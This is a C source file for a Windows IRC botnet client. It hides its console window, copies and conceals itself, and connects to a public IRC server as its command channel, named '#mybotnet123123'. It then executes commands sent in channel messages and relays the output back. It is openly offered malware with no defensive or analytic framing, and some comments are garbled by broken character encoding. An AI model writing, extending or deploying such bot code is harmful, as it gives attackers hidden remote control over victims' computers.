#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include "header.h"

HANDLE hMutex;

BOOL is_already_running() {
    // ʹ�� Mutex ��ֹ�ظ�����
    hMutex = CreateMutexW(NULL, FALSE, L"Global\\UpdateServiceMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        wprintf(L"[!] Another instance is already running.\n");
        return TRUE;
    }
    return FALSE;
}






 
int main(int argc, char* argv[]) {

    //Sleep(1000 * 2);

    if (!DEBUG) {
        HWND hwnd = GetConsoleWindow();  // ��ȡ����̨���ھ��
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);   // ���ش���
        }
    }

    if (!is_hidden_bot() && HIDE_ON_ENTRY) {
        printf("Starting to hide myself...\n");
        copy_and_hide_bot();
        WSACleanup();
        return 0;
    }
    else {
        printf("Is hidden process, starting to run...\n");
    }

    //if (is_already_running())// fuck this
    //    exit(0);

    const char* owner = "#mybotnet123123";
    const char* channel = "#mybotnet123123";
    int reconnectAttempts = 0;

    while (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
        SOCKET ircsock = TCPhandler("irc.libera.chat", "slave");
        if (ircsock == INVALID_SOCKET) {
            printf("Failed to connect to IRC server. Attempt %d of %d...\n",
                reconnectAttempts + 1, MAX_RECONNECT_ATTEMPTS);
            reconnectAttempts++;
            Sleep(RECONNECT_INTERVAL);
            continue;
        }

        // �Զ�����Ƶ��
        
        char joinCmd[128];
        snprintf(joinCmd, sizeof(joinCmd), "JOIN %s\r\n", channel);
        send(ircsock, joinCmd, (int)strlen(joinCmd), 0);
        printf("[+] �Ѽ���Ƶ��: %s\n", channel);

        // ������������
        char notice[512];
        snprintf(notice, sizeof(notice), "PRIVMSG %s :Bot is online!\r\n", owner);
        send(ircsock, notice, (int)strlen(notice), 0);

        char buf[4096];
        MessageBuffer msgBuffer;

        while (1) {
            int n = recv(ircsock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) {
                printf("Connection closed by server.\n");
                closesocket(ircsock);
                break;
            }

            buf[n] = '\0';  // Null-terminate
            printf("Received:\n%s\n", buf);

            // ���� PING/PONG
            if (strncmp(buf, "PING", 4) == 0) {
                char pong[512];
                snprintf(pong, sizeof(pong), "PONG%s\r\n", buf + 4);
                send(ircsock, pong, (int)strlen(pong), 0);
                continue;
            }

            // ���� PRIVMSG
            char* privmsg = strstr(buf, "PRIVMSG");
            if (privmsg != NULL) {

                // ������Ϣ������ʼλ�ã���һ�� ':' ��
                char* colon = strchr(privmsg, ':');
                if (colon != NULL) {
                    char* command = colon + 1;

                    // ȥ��ǰ��հ��ַ�
                    char* end = command + strlen(command);
                    while (end > command && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' '))
                        end--;
                    *end = '\0';

                    // ��ʼ����Ϣ������
                    initMessageBuffer(&msgBuffer, owner);

                    // ������ִ������
                    ParsedCommand parsedCmd = parsecommand(command);
                    char* result = execute_parsed_command(parsedCmd, ircsock);

                    if (result) {
                        char* resultCopy = strdup(result);
                        char* token;
                        char* context = NULL;
                        token = strtok_s(resultCopy, "\n", &context);

                        while (token != NULL) {
                            appendToBuffer(&msgBuffer, ircsock, token);
                            token = strtok_s(NULL, "\n", &context);
                        }

                    
                        flushBuffer(&msgBuffer, ircsock);

                        free(resultCopy);
                        free(result);
                    }
                }
            }

            memset(buf, 0, sizeof(buf));
        }

        reconnectAttempts++;
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            printf("Reconnecting in %d seconds...\n", RECONNECT_INTERVAL / 1000);
            Sleep(RECONNECT_INTERVAL);
        }
    }

    WSACleanup();
    return 0;
}